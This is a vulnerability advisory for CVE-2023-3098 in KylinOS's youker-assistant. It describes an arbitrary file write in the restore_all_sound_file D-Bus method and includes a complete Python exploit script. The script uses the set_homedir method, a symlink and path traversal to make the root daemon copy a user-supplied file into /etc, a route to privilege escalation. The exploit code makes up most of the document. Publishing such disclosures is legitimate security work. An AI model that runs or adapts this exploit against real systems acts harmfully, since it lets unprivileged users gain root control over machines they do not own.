# Kylin OS youker-assistant arbitrary file write vuln

Author: Set3r.Pan（8691003@qq.com）\
Unit: KylinSoft（https://www.kylinos.cn/）
### CVE ID
CVE-2023-3098
## Report
### Describe
youker-assistant is an integrated tool on KylinOS Desktop to help perform daily system maintenance tasks. The restore_all_sound_file in this program has an arbitrary file writing vulnerability, which can lead to privilege escalation for ordinary users.
### Hazard level
High
### Affected version
- youker-assistant < 3.0.2-0kylin6k70-23
### POC&&EXP
ISO Download:\
https://distro-images.kylinos.cn:8802/web_pungi/download/share/HXDYtGjZm3daA4UvOTLkiPl1nB9ErM0c/

exploit.py
```
#!/usr/bin/env python3

import sys
import dbus
import os

def run_cmd(cmd):
    os.system(cmd)

def copy_file(target_dir, src_file):
    copy_cmd=f'''
        srcDir=$(mktemp -d)
        homeDir=/tmp/fakeroot/$srcDir
        srcFile={src_file}
        targetDir={target_dir}
        gdbus call --system --dest com.kylin.assistant.systemdaemon \
                        --object-path /com/kylin/assistant/systemdaemon \
                        --method com.kylin.assistant.systemdaemon.set_homedir "$homeDir"

        # prepre src dir
        mkdir -p $srcDir/stereo
        cp $srcFile $srcDir/stereo

        # prepare target dir
        mkdir -p $homeDir
        mkdir -p $homeDir/.sounds..
        cd $homeDir
        ln -s $targetDir stereo

        gdbus call --system --dest com.kylin.assistant.systemdaemon \
                        --object-path /com/kylin/assistant/systemdaemon \
                        --method com.kylin.assistant.systemdaemon.restore_all_sound_file "../../../..$srcDir"

    '''
    run_cmd(copy_cmd)

os.system('touch restore_all_sound_file.txt')
copy_file("/etc", os.path.realpath("./restore_all_sound_file.txt"))
os.system('ls -l /etc/restore_all_sound_file.txt')
```
